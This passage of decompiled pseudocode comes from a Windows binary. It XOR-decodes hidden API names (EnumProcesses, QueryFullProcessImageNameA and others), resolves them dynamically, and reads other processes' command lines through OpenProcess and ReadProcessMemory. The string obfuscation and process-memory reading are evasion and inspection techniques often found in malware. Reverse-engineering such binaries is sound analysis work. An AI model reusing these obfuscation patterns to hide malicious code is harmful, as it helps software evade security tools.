  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC014;
  if ( dword_1400DC014 & 1 )
  {
    v2 = byte_1400DC010;
  }
  else
  {
    v1 = 69069 * dword_1400DC008 + 1234567;
    v0 = dword_1400DC014 | 1;
    dword_1400DC008 = v1;
    dword_1400DC014 |= 1u;
    dword_1400DC000 = HIWORD(dword_1400DC000) + 36969 * (unsigned __int16)dword_1400DC000;
    LOBYTE(v1) = (BYTE2(dword_1400DC00C) + 80 * dword_1400DC00C) ^ v1;
    dword_1400DC00C = HIWORD(dword_1400DC00C) + 18000 * (unsigned __int16)dword_1400DC00C;
    v2 = (((unsigned int)dword_1400DC004 >> 13) ^ 32 * dword_1400DC004 ^ dword_1400DC004) + v1;
    dword_1400DC004 ^= ((unsigned int)dword_1400DC004 >> 13) ^ 32 * (dword_1400DC004 ^ (dword_1400DC004 << 12));
    byte_1400DC010 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC014 = v0 | 2;
    byte_1400DC018[0] = v2 ^ 0x47;
    byte_1400DC019 = (v2 - 1) ^ 0x65;
    byte_1400DC01A = (v2 - 2) ^ 0x74;
    byte_1400DC01B = (v2 - 3) ^ 0x50;
    byte_1400DC01C = (v2 - 4) ^ 0x72;
    byte_1400DC01D = (v2 - 5) ^ 0x6F;
    byte_1400DC01E = (v2 - 6) ^ 0x63;
    byte_1400DC01F = (v2 - 7) ^ 0x65;
    byte_1400DC020 = (v2 - 8) ^ 0x73;
    byte_1400DC021 = (v2 - 9) ^ 0x73;
    byte_1400DC022 = (v2 - 10) ^ 0x49;
    byte_1400DC023 = (v2 - 11) ^ 0x6D;
    byte_1400DC024 = (v2 - 12) ^ 0x61;
    byte_1400DC025 = (v2 - 13) ^ 0x67;
    byte_1400DC026 = (v2 - 14) ^ 0x65;
    byte_1400DC027 = (v2 - 15) ^ 0x46;
    byte_1400DC028 = (v2 - 16) ^ 0x69;
    byte_1400DC029 = (v2 - 17) ^ 0x6C;
    byte_1400DC02A = (v2 - 18) ^ 0x65;
    byte_1400DC02B = (v2 - 19) ^ 0x4E;
    byte_1400DC02C = (v2 - 20) ^ 0x61;
    byte_1400DC02D = (v2 - 21) ^ 0x6D;
    byte_1400DC02E = (v2 - 22) ^ 0x65;
    byte_1400DC02F = (v2 - 23) ^ 0x41;
  }
  result = byte_1400DC030;
  if ( !byte_1400DC030[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC018[v5++];
      v7 = v2 - v4++;
      byte_1400DC030[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x18 );
  }
  return result;
}
// 1400DC000: using guessed type int dword_1400DC000;
// 1400DC004: using guessed type int dword_1400DC004;
// 1400DC008: using guessed type int dword_1400DC008;
// 1400DC00C: using guessed type int dword_1400DC00C;
// 1400DC010: using guessed type char byte_1400DC010;
// 1400DC014: using guessed type int dword_1400DC014;
// 1400DC019: using guessed type char byte_1400DC019;
// 1400DC01A: using guessed type char byte_1400DC01A;
// 1400DC01B: using guessed type char byte_1400DC01B;
// 1400DC01C: using guessed type char byte_1400DC01C;
// 1400DC01D: using guessed type char byte_1400DC01D;
// 1400DC01E: using guessed type char byte_1400DC01E;
// 1400DC01F: using guessed type char byte_1400DC01F;
// 1400DC020: using guessed type char byte_1400DC020;
// 1400DC021: using guessed type char byte_1400DC021;
// 1400DC022: using guessed type char byte_1400DC022;
// 1400DC023: using guessed type char byte_1400DC023;
// 1400DC024: using guessed type char byte_1400DC024;
// 1400DC025: using guessed type char byte_1400DC025;
// 1400DC026: using guessed type char byte_1400DC026;
// 1400DC027: using guessed type char byte_1400DC027;
// 1400DC028: using guessed type char byte_1400DC028;
// 1400DC029: using guessed type char byte_1400DC029;
// 1400DC02A: using guessed type char byte_1400DC02A;
// 1400DC02B: using guessed type char byte_1400DC02B;
// 1400DC02C: using guessed type char byte_1400DC02C;
// 1400DC02D: using guessed type char byte_1400DC02D;
// 1400DC02E: using guessed type char byte_1400DC02E;
// 1400DC02F: using guessed type char byte_1400DC02F;

//----- (000000014007E510) ----------------------------------------------------
_QWORD *__fastcall sub_14007E510(__int64 a1, __int64 a2, DWORD a3)
{
  DWORD v3; // edi
  _QWORD *v4; // rsi
  __int64 v5; // r14
  size_t v6; // rbx
  HANDLE v7; // rdi
  unsigned int (__fastcall *v8)(HANDLE, _QWORD, char *, int *); // rax
  signed __int64 v9; // r9
  unsigned int (__fastcall *v10)(HANDLE, char *); // rax
  _QWORD *v11; // rax
  _QWORD *v12; // rax
  int v14; // [rsp+34h] [rbp-CCh]
  int v15; // [rsp+38h] [rbp-C8h]
  int v16; // [rsp+40h] [rbp-C0h]
  int v17; // [rsp+44h] [rbp-BCh]
  void *v18[2]; // [rsp+48h] [rbp-B8h]
  __int64 v19; // [rsp+58h] [rbp-A8h]
  __int64 v20; // [rsp+60h] [rbp-A0h]
  __int64 v21; // [rsp+68h] [rbp-98h]
  void *v22; // [rsp+70h] [rbp-90h]
  __int64 v23; // [rsp+80h] [rbp-80h]
  unsigned __int64 v24; // [rsp+88h] [rbp-78h]
  void *v25; // [rsp+90h] [rbp-70h]
  __int64 v26; // [rsp+A0h] [rbp-60h]
  unsigned __int64 v27; // [rsp+A8h] [rbp-58h]
  void *v28; // [rsp+B0h] [rbp-50h]
  unsigned __int64 v29; // [rsp+C8h] [rbp-38h]
  char Dst[104]; // [rsp+D0h] [rbp-30h]

  v21 = -2i64;
  v3 = a3;
  v4 = (_QWORD *)a2;
  v5 = a1;
  v20 = a2;
  v6 = 0i64;
  *(_QWORD *)(a2 + 24) = 15i64;
  *(_QWORD *)(a2 + 16) = 0i64;
  *(_BYTE *)a2 = 0;
  v15 = 1;
  v16 = 1024;
  v17 = 4096;
  _mm_storeu_si128((__m128i *)v18, (__m128i)0i64);
  v19 = 0i64;
  sub_14007DED0((__int64)v18, 0i64, &v16, (__int64)v18);
  v7 = sub_140080F70(v3, (DWORD **)v18);
  if ( v18[0] )
  {
    operator delete(v18[0]);
    _mm_storeu_si128((__m128i *)v18, (__m128i)0i64);
    v19 = 0i64;
  }
  if ( v7 )
  {
    memset(Dst, 0, 0x104ui64);
    v14 = 259;
    v8 = *(unsigned int (__fastcall **)(HANDLE, _QWORD, char *, int *))(v5 + 24);
    if ( v8 && v8(v7, 0i64, Dst, &v14) )
    {
      if ( Dst[0] )
      {
        v9 = -1i64;
        do
          ++v9;
        while ( Dst[v9] );
        v6 = v9;
      }
      sub_140004F20(v4, Dst, v6);
    }
    else
    {
      v10 = *(unsigned int (__fastcall **)(HANDLE, char *))(v5 + 32);
      if ( v10 && v10(v7, Dst) )
      {
        sub_14007DDE0(&v28, Dst, 0i64);
        v11 = sub_140080C70((__int64)&v22, &v28);
        v12 = sub_1400054F0(v11, &v25);
        if ( v4 != v12 )
          sub_140004DF0(v4, v12, 0i64, 0xFFFFFFFFFFFFFFFFui64);
        if ( v27 >= 0x10 )
          operator delete(v25);
        v27 = 15i64;
        v26 = 0i64;
        LOBYTE(v25) = 0;
        if ( v24 >= 8 )
          operator delete(v22);
        v24 = 7i64;
        v23 = 0i64;
        LOWORD(v22) = 0;
        if ( v29 >= 8 )
          operator delete(v28);
      }
    }
    CloseHandle(v7);
  }
  return v4;
}
// 14007DDE0: using guessed type __int64 __fastcall sub_14007DDE0(_QWORD, _QWORD, _QWORD);
// 14007E510: using guessed type char Dst[104];

//----- (000000014007E730) ----------------------------------------------------
char *sub_14007E730()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC04C;
  if ( dword_1400DC04C & 1 )
  {
    v2 = byte_1400DC049;
  }
  else
  {
    v1 = 69069 * dword_1400DC008 + 1234567;
    v0 = dword_1400DC04C | 1;
    dword_1400DC008 = v1;
    dword_1400DC04C |= 1u;
    dword_1400DC000 = HIWORD(dword_1400DC000) + 36969 * (unsigned __int16)dword_1400DC000;
    LOBYTE(v1) = (BYTE2(dword_1400DC00C) + 80 * dword_1400DC00C) ^ v1;
    dword_1400DC00C = HIWORD(dword_1400DC00C) + 18000 * (unsigned __int16)dword_1400DC00C;
    v2 = (((unsigned int)dword_1400DC004 >> 13) ^ 32 * dword_1400DC004 ^ dword_1400DC004) + v1;
    dword_1400DC004 ^= ((unsigned int)dword_1400DC004 >> 13) ^ 32 * (dword_1400DC004 ^ (dword_1400DC004 << 12));
    byte_1400DC049 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC04C = v0 | 2;
    byte_1400DC050[0] = v2 ^ 0x51;
    byte_1400DC051 = (v2 - 1) ^ 0x75;
    byte_1400DC052 = (v2 - 2) ^ 0x65;
    byte_1400DC053 = (v2 - 3) ^ 0x72;
    byte_1400DC054 = (v2 - 4) ^ 0x79;
    byte_1400DC055 = (v2 - 5) ^ 0x46;
    byte_1400DC056 = (v2 - 6) ^ 0x75;
    byte_1400DC057 = (v2 - 7) ^ 0x6C;
    byte_1400DC058 = (v2 - 8) ^ 0x6C;
    byte_1400DC059 = (v2 - 9) ^ 0x50;
    byte_1400DC05A = (v2 - 10) ^ 0x72;
    byte_1400DC05B = (v2 - 11) ^ 0x6F;
    byte_1400DC05C = (v2 - 12) ^ 0x63;
    byte_1400DC05D = (v2 - 13) ^ 0x65;
    byte_1400DC05E = (v2 - 14) ^ 0x73;
    byte_1400DC05F = (v2 - 15) ^ 0x73;
    byte_1400DC060 = (v2 - 16) ^ 0x49;
    byte_1400DC061 = (v2 - 17) ^ 0x6D;
    byte_1400DC062 = (v2 - 18) ^ 0x61;
    byte_1400DC063 = (v2 - 19) ^ 0x67;
    byte_1400DC064 = (v2 - 20) ^ 0x65;
    byte_1400DC065 = (v2 - 21) ^ 0x4E;
    byte_1400DC066 = (v2 - 22) ^ 0x61;
    byte_1400DC067 = (v2 - 23) ^ 0x6D;
    byte_1400DC068 = (v2 - 24) ^ 0x65;
    byte_1400DC069 = (v2 - 25) ^ 0x41;
  }
  result = byte_1400DC070;
  if ( !byte_1400DC070[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC050[v5++];
      v7 = v2 - v4++;
      byte_1400DC070[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x1A );
  }
  return result;
}
// 1400DC000: using guessed type int dword_1400DC000;
// 1400DC004: using guessed type int dword_1400DC004;
// 1400DC008: using guessed type int dword_1400DC008;
// 1400DC00C: using guessed type int dword_1400DC00C;
// 1400DC049: using guessed type char byte_1400DC049;
// 1400DC04C: using guessed type int dword_1400DC04C;
// 1400DC051: using guessed type char byte_1400DC051;
// 1400DC052: using guessed type char byte_1400DC052;
// 1400DC053: using guessed type char byte_1400DC053;
// 1400DC054: using guessed type char byte_1400DC054;
// 1400DC055: using guessed type char byte_1400DC055;
// 1400DC056: using guessed type char byte_1400DC056;
// 1400DC057: using guessed type char byte_1400DC057;
// 1400DC058: using guessed type char byte_1400DC058;
// 1400DC059: using guessed type char byte_1400DC059;
// 1400DC05A: using guessed type char byte_1400DC05A;
// 1400DC05B: using guessed type char byte_1400DC05B;
// 1400DC05C: using guessed type char byte_1400DC05C;
// 1400DC05D: using guessed type char byte_1400DC05D;
// 1400DC05E: using guessed type char byte_1400DC05E;
// 1400DC05F: using guessed type char byte_1400DC05F;
// 1400DC060: using guessed type char byte_1400DC060;
// 1400DC061: using guessed type char byte_1400DC061;
// 1400DC062: using guessed type char byte_1400DC062;
// 1400DC063: using guessed type char byte_1400DC063;
// 1400DC064: using guessed type char byte_1400DC064;
// 1400DC065: using guessed type char byte_1400DC065;
// 1400DC066: using guessed type char byte_1400DC066;
// 1400DC067: using guessed type char byte_1400DC067;
// 1400DC068: using guessed type char byte_1400DC068;
// 1400DC069: using guessed type char byte_1400DC069;

//----- (000000014007E960) ----------------------------------------------------
_QWORD *__fastcall sub_14007E960(_QWORD *a1, const CHAR *a2)
{
  _QWORD *v2; // rbx
  HMODULE v3; // rax
  char *v4; // rax

  v2 = a1;
  *a1 = &off_1400B0EE8;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const CHAR **)a2;
  v3 = LoadLibraryA(a2);
  v2[1] = v3;
  if ( v3 )
  {
    v4 = sub_14007EA30();
    v2[2] = GetProcAddress((HMODULE)v2[1], v4);
  }
  return v2;
}
// 1400B0EE8: using guessed type __int64 (__fastcall *off_1400B0EE8)(void *);

//----- (000000014007E9D0) ----------------------------------------------------
_QWORD *__fastcall sub_14007E9D0(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx
  HMODULE v4; // rcx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400B0EE8;
  v4 = (HMODULE)*((_QWORD *)a1 + 1);
  if ( v4 )
    FreeLibrary(v4);
  *v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();
// 1400B0EE8: using guessed type __int64 (__fastcall *off_1400B0EE8)(void *);

//----- (000000014007EA30) ----------------------------------------------------
char *sub_14007EA30()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC0A4;
  if ( dword_1400DC0A4 & 1 )
  {
    v2 = byte_1400DC0A0;
  }
  else
  {
    v1 = 69069 * dword_1400DC098 + 1234567;
    v0 = dword_1400DC0A4 | 1;
    dword_1400DC098 = v1;
    dword_1400DC0A4 |= 1u;
    dword_1400DC090 = HIWORD(dword_1400DC090) + 36969 * (unsigned __int16)dword_1400DC090;
    LOBYTE(v1) = (BYTE2(dword_1400DC09C) + 80 * dword_1400DC09C) ^ v1;
    dword_1400DC09C = HIWORD(dword_1400DC09C) + 18000 * (unsigned __int16)dword_1400DC09C;
    v2 = (((unsigned int)dword_1400DC094 >> 13) ^ 32 * dword_1400DC094 ^ dword_1400DC094) + v1;
    dword_1400DC094 ^= ((unsigned int)dword_1400DC094 >> 13) ^ 32 * (dword_1400DC094 ^ (dword_1400DC094 << 12));
    byte_1400DC0A0 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DC0A4 = v0 | 2;
    byte_1400DC0A8[0] = v2 ^ 0x45;
    byte_1400DC0A9 = (v2 - 1) ^ 0x6E;
    byte_1400DC0AA = (v2 - 2) ^ 0x75;
    byte_1400DC0AB = (v2 - 3) ^ 0x6D;
    byte_1400DC0AC = (v2 - 4) ^ 0x50;
    byte_1400DC0AD = (v2 - 5) ^ 0x72;
    byte_1400DC0AE = (v2 - 6) ^ 0x6F;
    byte_1400DC0AF = (v2 - 7) ^ 0x63;
    byte_1400DC0B0 = (v2 - 8) ^ 0x65;
    byte_1400DC0B1 = (v2 - 9) ^ 0x73;
    byte_1400DC0B2 = (v2 - 10) ^ 0x73;
    byte_1400DC0B3 = (v2 - 11) ^ 0x65;
    byte_1400DC0B4 = (v2 - 12) ^ 0x73;
  }
  result = byte_1400DC0B8;
  if ( !byte_1400DC0B8[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC0A8[v5++];
      v7 = v2 - v4++;
      byte_1400DC0B8[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0xD );
  }
  return result;
}
// 1400DC090: using guessed type int dword_1400DC090;
// 1400DC094: using guessed type int dword_1400DC094;
// 1400DC098: using guessed type int dword_1400DC098;
// 1400DC09C: using guessed type int dword_1400DC09C;
// 1400DC0A0: using guessed type char byte_1400DC0A0;
// 1400DC0A4: using guessed type int dword_1400DC0A4;
// 1400DC0A9: using guessed type char byte_1400DC0A9;
// 1400DC0AA: using guessed type char byte_1400DC0AA;
// 1400DC0AB: using guessed type char byte_1400DC0AB;
// 1400DC0AC: using guessed type char byte_1400DC0AC;
// 1400DC0AD: using guessed type char byte_1400DC0AD;
// 1400DC0AE: using guessed type char byte_1400DC0AE;
// 1400DC0AF: using guessed type char byte_1400DC0AF;
// 1400DC0B0: using guessed type char byte_1400DC0B0;
// 1400DC0B1: using guessed type char byte_1400DC0B1;
// 1400DC0B2: using guessed type char byte_1400DC0B2;
// 1400DC0B3: using guessed type char byte_1400DC0B3;
// 1400DC0B4: using guessed type char byte_1400DC0B4;

//----- (000000014007EBD0) ----------------------------------------------------
unsigned __int64 *__fastcall sub_14007EBD0(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // r14
  __int64 v3; // rbx
  unsigned int (__fastcall *v4)(char *, signed __int64, unsigned int *); // rdi
  unsigned __int64 v5; // rbp
  char *v6; // rcx
  unsigned __int64 v7; // rdx
  char *v8; // rdi
  signed __int64 v9; // rsi
  signed __int64 v10; // rcx
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // rbx
  int v13; // eax
  signed __int64 v14; // rcx
  unsigned __int64 v15; // rbx
  unsigned __int64 v16; // rbx
  unsigned int v18; // [rsp+20h] [rbp-1068h]
  __int128 v19; // [rsp+28h] [rbp-1060h]
  __int64 v20; // [rsp+38h] [rbp-1050h]
  int v21; // [rsp+40h] [rbp-1048h]
  __int64 v22; // [rsp+48h] [rbp-1040h]
  char Dst; // [rsp+50h] [rbp-1038h]

  v22 = -2i64;
  v2 = a2;
  v21 = 0;
  _mm_storeu_si128((__m128i *)&v19, (__m128i)0i64);
  v3 = 0i64;
  v20 = 0i64;
  v4 = *(unsigned int (__fastcall **)(char *, signed __int64, unsigned int *))(a1 + 16);
  if ( !v4 )
  {
    *a2 = 0i64;
    a2[1] = 0i64;
    a2[2] = 0i64;
    return v2;
  }
  memset(&Dst, 0, 0x1000ui64);
  v18 = 4096;
  if ( !v4(&Dst, 4096i64, &v18) )
  {
    *v2 = 0i64;
    v2[1] = 0i64;
    v2[2] = 0i64;
    return v2;
  }
  v5 = 0i64;
  v6 = (char *)*((_QWORD *)&v19 + 1);
  v7 = v19;
  if ( !(v18 & 0xFFFFFFFC) )
    goto LABEL_38;
  v8 = &Dst;
  while ( !*(_DWORD *)v8 )
  {
LABEL_34:
    ++v5;
    v8 += 4;
    if ( v5 >= (unsigned __int64)v18 >> 2 )
      goto LABEL_38;
  }
  if ( v8 >= v6 || v7 > (unsigned __int64)v8 )
  {
    if ( v6 == (char *)v3 && (unsigned __int64)((v3 - (signed __int64)v6) >> 2) < 1 )
    {
      v14 = (signed __int64)&v6[-v7] >> 2;
      if ( (unsigned __int64)(0x3FFFFFFFFFFFFFFFi64 - v14) < 1 )
        goto LABEL_37;
      v15 = (signed __int64)(v3 - v7) >> 2;
      if ( 0x3FFFFFFFFFFFFFFFi64 - (v15 >> 1) >= v15 )
        v16 = (v15 >> 1) + v15;
      else
        v16 = 0i64;
      if ( v16 < v14 + 1 )
        v16 = v14 + 1;
      sub_14001BFD0((__int64)&v19, v16);
      v3 = v20;
      v6 = (char *)*((_QWORD *)&v19 + 1);
      v7 = v19;
    }
    if ( !v6 )
      goto LABEL_33;
    v13 = *(_DWORD *)v8;
    goto LABEL_32;
  }
  v9 = (signed __int64)&v8[-v7] >> 2;
  if ( v6 != (char *)v3 || (unsigned __int64)((v3 - (signed __int64)v6) >> 2) >= 1 )
  {
LABEL_19:
    if ( !v6 )
    {
LABEL_33:
      v6 += 4;
      *((_QWORD *)&v19 + 1) = v6;
      goto LABEL_34;
    }
    v13 = *(_DWORD *)(v7 + 4 * v9);
LABEL_32:
    *(_DWORD *)v6 = v13;
    goto LABEL_33;
  }
  v10 = (signed __int64)&v6[-v7] >> 2;
  if ( (unsigned __int64)(0x3FFFFFFFFFFFFFFFi64 - v10) >= 1 )
  {
    v11 = (signed __int64)(v3 - v7) >> 2;
    if ( 0x3FFFFFFFFFFFFFFFi64 - (v11 >> 1) >= v11 )
      v12 = (v11 >> 1) + v11;
    else
      v12 = 0i64;
    if ( v12 < v10 + 1 )
      v12 = v10 + 1;
    sub_14001BFD0((__int64)&v19, v12);
    v3 = v20;
    v6 = (char *)*((_QWORD *)&v19 + 1);
    v7 = v19;
    goto LABEL_19;
  }
  std::_Xlength_error("vector<T> too long");
  __debugbreak();
LABEL_37:
  std::_Xlength_error("vector<T> too long");
  __debugbreak();
LABEL_38:
  *v2 = v7;
  v2[1] = (unsigned __int64)v6;
  v2[2] = v3;
  return v2;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014007EE50) ----------------------------------------------------
__int64 __fastcall sub_14007EE50(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  _QWORD *v5; // rsi
  _DWORD *v6; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = operator new(0x20ui64);
  if ( v6 )
  {
    v6[2] = 1;
    v6[3] = 1;
    *(_QWORD *)v6 = &off_1400B0FA8;
    *((_QWORD *)v6 + 2) = v4;
    *((_QWORD *)v6 + 3) = v3;
  }
  return sub_140029830(v5, v4, (__int64)v6);
}
// 1400B0FA8: using guessed type __int64 (__fastcall *off_1400B0FA8)();

//----- (000000014007EED0) ----------------------------------------------------
_QWORD *__fastcall sub_14007EED0(_QWORD *a1, const CHAR *a2)
{
  _QWORD *v2; // rbx
  HMODULE v3; // rax
  char *v4; // rax

  v2 = a1;
  *a1 = &off_1400B0F98;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const CHAR **)a2;
  v3 = LoadLibraryA(a2);
  v2[1] = v3;
  if ( v3 )
  {
    v4 = sub_14007F4E0();
    v2[2] = GetProcAddress((HMODULE)v2[1], v4);
  }
  return v2;
}
// 1400B0F98: using guessed type __int64 (__fastcall *off_1400B0F98)(void *);

//----- (000000014007EF50) ----------------------------------------------------
_QWORD *__fastcall sub_14007EF50(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx
  HMODULE v4; // rcx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400B0F98;
  v4 = (HMODULE)*((_QWORD *)a1 + 1);
  if ( v4 )
  {
    v3[2] = 0i64;
    FreeLibrary(v4);
    v3[1] = 0i64;
  }
  *v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();
// 1400B0F98: using guessed type __int64 (__fastcall *off_1400B0F98)(void *);

//----- (000000014007EFC0) ----------------------------------------------------
void ***__fastcall sub_14007EFC0(__int64 a1, void ***a2, DWORD a3)
{
  void ***v3; // r14
  __int64 v4; // rsi
  unsigned __int64 v5; // r15
  unsigned __int64 v6; // rdx
  HANDLE v7; // rax
  HANDLE v8; // r13
  LPCVOID *v9; // rax
  LPCVOID *v10; // rbx
  LPCVOID *v11; // rdi
  int v12; // eax
  LPCVOID *v13; // rcx
  unsigned int v14; // edi
  WCHAR *v15; // rsi
  CHAR *v16; // rdi
  void **v17; // r8
  __int64 v18; // r8
  void **v19; // rax
  __int64 v20; // rax
  void **v21; // rcx
  unsigned __int64 v22; // r8
  size_t v23; // r8
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // rcx
  volatile signed __int32 *v26; // rbx
  unsigned __int64 v28; // [rsp+40h] [rbp-C0h]
  HANDLE hProcess[2]; // [rsp+48h] [rbp-B8h]
  SIZE_T NumberOfBytesRead; // [rsp+58h] [rbp-A8h]
  int cchWideChar; // [rsp+60h] [rbp-A0h]
  LPCVOID *v32; // [rsp+68h] [rbp-98h]
  size_t v33; // [rsp+70h] [rbp-90h]
  int v34; // [rsp+78h] [rbp-88h]
  __int64 v35; // [rsp+80h] [rbp-80h]
  WCHAR *v36; // [rsp+88h] [rbp-78h]
  CHAR *v37; // [rsp+90h] [rbp-70h]
  char Dst; // [rsp+A0h] [rbp-60h]
  LPCVOID lpBaseAddress; // [rsp+C0h] [rbp-40h]
  char Buffer; // [rsp+2F0h] [rbp+1F0h]
  unsigned __int16 v41; // [rsp+360h] [rbp+260h]
  LPCVOID v42; // [rsp+368h] [rbp+268h]
  void **Src; // [rsp+6E0h] [rbp+5E0h]
  void **v44; // [rsp+6F0h] [rbp+5F0h]
  unsigned __int64 v45; // [rsp+6F8h] [rbp+5F8h]

  v35 = -2i64;
  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  v34 = 0;
  v45 = 15i64;
  v44 = 0i64;
  LOBYTE(Src) = 0;
  if ( *(_QWORD *)(a1 + 16) )
  {
    v7 = OpenProcess(0x410u, 0, a3);
    _mm_storeu_si128((__m128i *)hProcess, (__m128i)0i64);
    sub_14007EE50(hProcess, (__int64)v7, (__int64)CloseHandle);
    v8 = hProcess[0];
    if ( (unsigned __int64)hProcess[0] - 1 > 0xFFFFFFFFFFFFFFFDui64 )
    {
      v3[3] = (void **)15;
      v3[2] = 0i64;
      *(_BYTE *)v3 = 0;
      v25 = v45;
      if ( v45 >= 0x10 )
      {
        *v3 = Src;
        Src = 0i64;
      }
      else if ( v44 != (void **)-1i64 )
      {
        memmove(v3, &Src, (size_t)v44 + 1);
        v25 = v45;
      }
      v3[2] = v44;
      v3[3] = (void **)v25;
      v45 = 15i64;
      v44 = 0i64;
      LOBYTE(Src) = 0;
    }
    else
    {
      v9 = (LPCVOID *)operator new(0x30ui64);
      v10 = v9;
      v32 = v9;
      v11 = v9;
      LODWORD(v28) = 0;
      v12 = (*(__int64 (__fastcall **)(HANDLE, _QWORD, LPCVOID *, signed __int64, unsigned __int64 *))(v4 + 16))(
              v8,
              0i64,
              v9,
              48i64,
              &v28);
      if ( v12 < 0 )
        goto LABEL_66;
      if ( (unsigned int)v28 > 0x30 )
      {
        v11 = (LPCVOID *)operator new((unsigned int)v28);
        v13 = v10;
        v10 = v11;
        v32 = v11;
        if ( v13 )
          operator delete(v13);
        v12 = (*(__int64 (__fastcall **)(HANDLE, _QWORD, LPCVOID *, _QWORD, unsigned __int64 *))(v4 + 16))(
                v8,
                0i64,
                v11,
                (unsigned int)v28,
                &v28);
      }
      if ( v12 >= 0 && v11[1] )
      {
        memset(&Dst, 0, 0x248ui64);
        NumberOfBytesRead = 0i64;
        if ( ReadProcessMemory(v8, v11[1], &Dst, 0x248ui64, &NumberOfBytesRead) )
        {
          memset(&Buffer, 0, 0x3F0ui64);
          if ( ReadProcessMemory(v8, lpBaseAddress, &Buffer, 0x3F0ui64, &NumberOfBytesRead) )
          {
            if ( v41 )
            {
              cchWideChar = (unsigned int)v41 >> 1;
              v14 = (unsigned int)v41 >> 1;
              v33 = (unsigned int)cchWideChar;
              v15 = (WCHAR *)operator new(saturated_mul((unsigned int)cchWideChar, 2ui64));
              v36 = v15;
              if ( ReadProcessMemory(v8, v42, v15, v41, &NumberOfBytesRead) )
              {
                v16 = (CHAR *)operator new(v14);
                v37 = v16;
                WideCharToMultiByte(0, 0, v15, cchWideChar, v16, cchWideChar, 0i64, 0i64);
                v17 = (void **)&Src;
                if ( v45 >= 0x10 )
                  v17 = Src;
                v18 = (__int64)v17 + (_QWORD)v44;
                v19 = (void **)&Src;
                if ( v45 >= 0x10 )
                  v19 = Src;
                v20 = (__int64)v19 + (_QWORD)v44;
                v21 = (void **)&Src;
                if ( v16 == &v16[v33] )
                {
                  if ( v45 >= 0x10 )
                    v21 = Src;
                  if ( v18 )
                    v22 = v18 - v20;
                  else
                    v22 = 0i64;
                  if ( v20 )
                    v5 = v20 - (_QWORD)v21;
                  sub_140005230(&Src, v5, v22);
                }
                else
                {
                  if ( v45 >= 0x10 )
                    v21 = Src;
                  if ( v18 )
                    v23 = v18 - v20;
                  else
                    v23 = 0i64;
                  if ( v20 )
                    v5 = v20 - (_QWORD)v21;
                  sub_140008200(&Src, v5, v23, v16, v33);
                }
                if ( v16 )
                  operator delete(v16);
              }
              if ( v15 )
                operator delete(v15);
            }
          }
        }
        sub_140003CB0(v3, &Src);
      }
      else
      {
LABEL_66:
        v3[3] = (void **)15;
        v3[2] = 0i64;
        *(_BYTE *)v3 = 0;
        v24 = v45;
        if ( v45 >= 0x10 )
        {
          *v3 = Src;
          Src = 0i64;
        }
        else if ( v44 != (void **)-1i64 )
        {
          memmove(v3, &Src, (size_t)v44 + 1);
          v24 = v45;
        }
        v3[2] = v44;
        v3[3] = (void **)v24;
        v45 = 15i64;
        v44 = 0i64;
        LOBYTE(Src) = 0;
      }
      if ( v10 )
        operator delete(v10);
    }
    if ( hProcess[1] )
    {
      if ( !_InterlockedDecrement((volatile signed __int32 *)hProcess[1] + 2) )
      {
        v26 = (volatile signed __int32 *)hProcess[1];
        (**(void (__fastcall ***)(HANDLE))hProcess[1])(hProcess[1]);
        if ( !_InterlockedDecrement(v26 + 3) )
          (*(void (**)(void))(*(_QWORD *)hProcess[1] + 8i64))();
      }
    }
    if ( v45 >= 0x10 )
      operator delete(Src);
  }
  else
  {
    a2[3] = (void **)15;
    a2[2] = 0i64;
    *(_BYTE *)a2 = 0;
    v6 = v45;
    if ( v45 >= 0x10 )
    {
      *v3 = Src;
    }
    else if ( v44 != (void **)-1i64 )
    {
      memmove(v3, &Src, (size_t)v44 + 1);
      v6 = v45;
    }
    v3[2] = v44;
    v3[3] = (void **)v6;
  }
  return v3;
}

//----- (000000014007F4E0) ----------------------------------------------------
char *sub_14007F4E0()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DC0E0;
  if ( dword_1400DC0E0 & 1 )
  {
    v2 = byte_1400DC0DC;
  }
  else
  {
    v1 = 69069 * dword_1400DC0D4 + 1234567;
